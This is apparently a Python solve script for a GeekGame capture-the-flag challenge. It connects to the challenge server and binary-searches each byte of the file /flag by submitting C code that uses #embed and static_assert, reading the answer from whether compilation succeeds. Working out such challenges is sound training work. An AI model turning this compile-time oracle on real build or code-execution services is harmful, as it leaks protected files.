import socket

def bisect(file, offset):
    low = 0
    high = 256

    while high - low > 1:
        guess = (high + low) // 2
        code = f"""\
constexpr unsigned char flag[] = {{
#embed "/flag"
}};
static_assert(flag[{offset}] < {guess});
int main(void){{}}
END
"""
        print(f"flag[{offset}] < {guess}")
        file.write(code.encode())
        file.flush()
        #print("sent")
        result = file.readline()
        print(result.strip().decode())
        if b"Success" in result:
            high = guess
        else:
            file.readline()
            low = guess

    return low

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("prob07.geekgame.pku.edu.cn", 10007))
    token = input("token:")
    sock.sendall(token.encode())
    sock.sendall(b"\n")

    file = sock.makefile("rwb")
    for line in file:
        print(line.decode(), end="")
        if b"P.S Flag is at /flag on the server :)" in line:
            file.readline()
            break

    flag = ""
    for i in range(999):
        print(f"guessing offset {i}")
        char = chr(bisect(file, i))
        flag += char
        print(char)
        if char == "}":
            break
    print(flag)

main()
